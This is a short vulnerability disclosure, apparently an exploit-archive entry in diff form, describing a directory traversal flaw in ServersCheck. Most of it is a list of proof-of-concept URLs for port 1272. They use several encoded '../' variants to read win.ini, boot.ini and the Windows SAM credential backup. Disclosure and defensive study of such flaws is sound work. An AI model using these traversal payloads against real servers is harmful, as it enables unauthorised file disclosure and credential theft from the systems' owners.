@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/13810/info
+
+ServersCheck is affected by a directory traversal vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to disclose arbitrary files on an affected computer in the context of the affected application. This may aid in further attacks against the underlying system. 
+
+http://www.example.com:1272/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini
+http://www.example.com:1272/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini
+http://www.example.com:1272/..%2F..%2F..%2F..%2F..%2F../windows/repair/sam
+http://www.example.com:1272/.../.../.../.../.../.../.../.../.../boot.ini
+http://www.example.com:1272/../../ ../../../../../../../boot.ini
+http://www.example.com:1272/../../../../../../../../boot.ini
+http://www.example.com:1272/../../../../boot.ini 
